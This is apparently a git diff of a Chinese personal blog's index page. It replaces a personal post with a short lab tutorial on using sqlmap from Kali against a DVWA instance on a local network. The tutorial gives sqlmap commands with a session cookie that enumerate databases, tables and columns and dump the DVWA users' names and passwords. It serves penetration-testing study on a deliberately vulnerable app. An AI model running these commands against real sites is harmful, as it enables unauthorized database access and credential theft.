@@ -6,17 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://cuiyimeng.github.io/blog">
-  <title>崔伊萌的个人博客</title>
+  <title>mm</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
-<meta property="og:title" content="崔伊萌的个人博客">
+<meta property="og:title" content="mm">
 <meta property="og:url" content="https://cuiyimeng.github.io/blog/index.html">
-<meta property="og:site_name" content="崔伊萌的个人博客">
+<meta property="og:site_name" content="mm">
 <meta property="og:locale" content="zh-CN">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="崔伊萌的个人博客">
+<meta name="twitter:title" content="mm">
   
-    <link rel="alternative" href="/atom.xml" title="崔伊萌的个人博客" type="application/atom+xml">
+    <link rel="alternative" href="/atom.xml" title="mm" type="application/atom+xml">
   
   
     <link rel="icon" href="/favicon.png">
@@ -132,27 +132,38 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-chscg" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+    <article id="post-kali-Linux-Sqlmap-简单使用" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/blog/2018/11/20/chscg/">气死我了</a>
+      <a class="article-title" href="/blog/2018/11/27/kali-Linux-Sqlmap-简单使用/">kali Linux Sqlmap 简单使用</a>
     </h1>
   
 
         
-        <a href="/blog/2018/11/20/chscg/" class="archive-article-date">
-  	<time datetime="2018-11-20T08:07:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-20</time>
+        <a href="/blog/2018/11/27/kali-Linux-Sqlmap-简单使用/" class="archive-article-date">
+  	<time datetime="2018-11-27T05:55:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>今天崔洪殊和我说，她说她听了一会歌之后就想出轨，我很生气，但是她还不哄我，哄完我还说出轨，还在我手上写小王八我想出轨。暗示我脑袋绿，明示她想出轨。这事没完。生气、生气、生气！！！！！！！！！！！</p>
+        <p>目标机器：10.70.23.62<br>kali虚拟机：10.70.23.114<br>所用工具：sqlmap windows10搭建的dvwa 谷歌浏览器控制台</p>
+<p>首先进入dvwa页面</p>
+<p><img src="/blog/images/pasted-0.png" alt="upload successful"><br>然后选择sql注入</p>
+<p><img src="/blog/images/pasted-1.png" alt="upload successful"><br>用f12打开谷歌浏览器控制台</p>
+<p><img src="/blog/images/pasted-2.png" alt="upload successful"><br>在输入框输入1并点击提交，查看控制台可得到目标url</p>
+<p><img src="/blog/images/pasted-3.png" alt="upload successful"><br>下翻得到cookie</p>
+<p><img src="/blog/images/pasted-4.png" alt="upload successful"><br>然后使用kali sqlmap进行渗透测试，参数如下<br>root@kali:~# sqlmap -u ‘<a href="http://10.70.23.62/dvwa/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=%Submit&#39;--cookie=&#39;security=low" target="_blank" rel="noopener">http://10.70.23.62/dvwa/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=%Submit&#39;--cookie=&#39;security=low</a>; PHPSESSID=gq2j9hhr8nirrhn1l3tagc9vk5mn’</p>
+<p><img src="/blog/images/pasted-5.png" alt="upload successful"><br>而后使用命令查看数据库<br>root@kali:~# sqlmap -u ‘<a href="http://10.70.23.62/dvwa/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=%E6%8F%90%E4%BA%A4&#39;" target="_blank" rel="noopener">http://10.70.23.62/dvwa/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=%E6%8F%90%E4%BA%A4&#39;</a> –cookie=’security=low; PHPSESSID=gq2j9hhr8nirrhn1l3tagc9vk5’ –dbs</p>
+<p><img src="/blog/images/pasted-6.png" alt="upload successful"><br>查看表<br>root@kali:~# sqlmap -u ‘<a href="http://10.70.23.62/dvwa/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=%E6%8F%90%E4%BA%A4&#39;" target="_blank" rel="noopener">http://10.70.23.62/dvwa/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=%E6%8F%90%E4%BA%A4&#39;</a> –cookie=’security=low; PHPSESSID=gq2j9hhr8nirrhn1l3tagc9vk5’ -D dvwa –tables</p>
+<p><img src="/blog/images/pasted-7.png" alt="upload successful"><br>查看列<br>root@kali:~# sqlmap -u ‘<a href="http://10.70.23.62/dvwa/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=%E6%8F%90%E4%BA%A4&#39;" target="_blank" rel="noopener">http://10.70.23.62/dvwa/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=%E6%8F%90%E4%BA%A4&#39;</a> –cookie=’security=low; PHPSESSID=gq2j9hhr8nirrhn1l3tagc9vk5’ -D dvwa -T users –column</p>
+<p><img src="/blog/images/pasted-8.png" alt="upload successful"><br>查看用户名及密码<br>root@kali:~# sqlmap -u ‘<a href="http://10.70.23.62/dvwa/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=%E6%8F%90%E4%BA%A4&#39;" target="_blank" rel="noopener">http://10.70.23.62/dvwa/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=%E6%8F%90%E4%BA%A4&#39;</a> –cookie=’security=low; PHPSESSID=gq2j9hhr8nirrhn1l3tagc9vk5’ -D dvwa -T users -C user,password –column –dump</p>
+<p><img src="/blog/images/pasted-9.png" alt="upload successful"></p>
 
       
 
@@ -166,7 +177,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">生活</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">学习随笔</a>
         		</li>
       		
 		</ul>
@@ -176,7 +187,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2018/11/20/chscg/">展开全文 >></a>
+          <a class="article-more-a" href="/blog/2018/11/27/kali-Linux-Sqlmap-简单使用/">展开全文 >></a>
         </p>
       
 
@@ -450,6 +461,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">学习随笔</a>
               </li>
             
             <div class="clearfix"></div>
